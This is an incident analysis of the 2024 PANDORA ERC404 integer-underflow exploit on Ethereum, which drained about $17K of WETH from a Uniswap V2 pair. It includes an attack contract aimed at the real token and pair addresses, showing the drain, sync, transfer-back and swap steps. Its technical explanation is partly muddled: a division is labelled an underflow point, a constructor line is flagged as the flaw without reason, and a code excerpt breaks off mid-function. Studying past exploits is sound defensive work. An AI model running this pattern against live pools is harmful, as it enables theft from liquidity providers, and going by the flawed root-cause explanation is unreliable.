# PANDORA — ERC404 Integer Underflow Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | PANDORA |
| **Chain** | Ethereum |
| **Loss** | ~$17,000 |
| **PANDORA Token** | [0xddaDF1bf](https://etherscan.io/address/0xddaDF1bf44363D07E750C20219C2347Ed7D826b9) |
| **V2 Pair** | [0x89CB997C](https://etherscan.io/address/0x89CB997C36776D910Cfba8948Ce38613636CBc3c) |
| **Root Cause** | Integer underflow bug in the `transferFrom()` implementation of the PANDORA ERC404 token, causing a mismatch between pair reserves and actual balances — WETH drained via a combination of `sync()` and `swap()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/PANDORA_exp.sol) |

---

## 1. Vulnerability Overview

PANDORA is a token implementing the ERC404 standard. An integer underflow bug exists in its `transferFrom()` function. The attacker extracted most of the PANDORA tokens from the pair, leaving only 1, then called `sync()` to update the reserves. They subsequently transferred a large amount of PANDORA back, triggering an underflow via `transferFrom()` to create a discrepancy between reserves and actual balances, and finally called `swap()` to drain WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: ERC404 transferFrom integer underflow
function transferFrom(
    address from,
    address to,
    uint256 amount
) public override returns (bool) {
    uint256 allowed = allowance[from][msg.sender];
    // Underflow occurs in Solidity < 0.8 or inside an unchecked block
    // Underflow possible when computing ERC721 NFT balance of `from`
    uint256 fromNFTBalance = balanceOf[from] / _unit;  // ← underflow point
    // ...
    _transfer(from, to, amount);
    return true;
}

// ✅ Safe code: use SafeMath or checked arithmetic
function transferFrom(
    address from,
    address to,
    uint256 amount
) public override returns (bool) {
    require(balanceOf[from] >= amount, "insufficient balance");
    // Solidity 0.8+ checked arithmetic (no unchecked block)
    _transfer(from, to, amount);
    return true;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: PandorasNodes404.sol
contract PandorasNodes404 is ERC404 {
    string public dataURI;
    string public baseTokenURI;

    constructor(address _owner) ERC404("Pandora's Nodes 404", "BLOCK", 18, 200, _owner) {
        balanceOf[_owner] = totalSupply;  // ❌ vulnerability
        setWhitelist(_owner, true);
    }

    function setDataURI(string memory _dataURI) public onlyOwner {
        dataURI = _dataURI;
    }

    function setTokenURI(string memory _tokenURI) public onlyOwner {
        baseTokenURI = _tokenURI;
    }

    function setNameSymbol(string memory _name, string memory _symbol) public onlyOwner {
        _setNameSymbol(_name, _symbol);
    }

    function tokenURI(uint256 id) public view override returns (string memory) {
        if (bytes(baseTokenURI).length > 0) {
            return concatenate(baseTokenURI, Strings.toString(id));
        } else {
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Extract most PANDORA tokens from the pair (leave only 1)
  │
  ├─→ [2] Call pair.sync()
  │         └─ Reserves updated to 1 PANDORA
  │
  ├─→ [3] Transfer large amount of PANDORA back to the pair
  │         └─ Underflow triggered on transferFrom() call
  │
  ├─→ [4] Reserve/actual-balance discrepancy state created
  │
  ├─→ [5] Call pair.swap()
  │         └─ Receive excess WETH by exploiting the discrepancy
  │
  └─→ [6] ~$17K WETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// PANDORA is a non-standard ERC20 with no return value on transferFrom
interface NoReturnTransferFrom {
    function transferFrom(address from, address to, uint256 amount) external;
}

interface Uni_Pair_V2 {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    NoReturnTransferFrom constant PANDORA = NoReturnTransferFrom(0xddaDF1bf44363D07E750C20219C2347Ed7D826b9);
    Uni_Pair_V2          constant pair    = Uni_Pair_V2(0x89CB997C36776D910Cfba8948Ce38613636CBc3c);
    IERC20               constant WETH    = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // [1] Drain most of the pair's balance — leave only 1 token
        uint256 pairBal = IERC20(address(PANDORA)).balanceOf(address(pair));
        PANDORA.transferFrom(address(pair), address(this), pairBal - 1);

        // [2] Use sync to set reserves to 1
        pair.sync();

        // [3] Transfer large amount of PANDORA back (trigger underflow)
        PANDORA.transferFrom(address(this), address(pair), pairBal - 1);

        // [4] Swap against the reserve discrepancy state
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 wethOut = calculateWETHOut(r0, r1, pairBal - 1);
        pair.swap(0, wethOut, address(this), "");
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Integer Underflow |
| **CWE** | CWE-191: Integer Underflow |
| **Attack Vector** | External (transferFrom + sync + swap combination) |
| **DApp Classification** | ERC404 Hybrid Token + Uniswap V2 Pair |
| **Impact** | LP WETH drained via reserve manipulation |

## 6. Remediation Recommendations

1. **Use Solidity 0.8+**: checked arithmetic automatically reverts on underflow
2. **Minimize `unchecked` blocks**: use `unchecked` only when necessary and validate boundary conditions beforehand
3. **Review ERC404 transfer logic**: test all edge cases in ERC20/ERC721 hybrid balance calculations
4. **Standard return value**: comply with the ERC20 standard by having `transferFrom()` return a bool

## 7. Lessons Learned

- Hybrid standards like ERC404 manage ERC20 and ERC721 balances simultaneously, making them highly susceptible to underflow risks.
- The pattern of artificially lowering reserves via `sync()` before transferring a large amount amplifies underflow vulnerabilities.
- ERC404 tokens integrated with Uniswap V2 pairs must have numeric boundary conditions explicitly verified during audits of novel standards.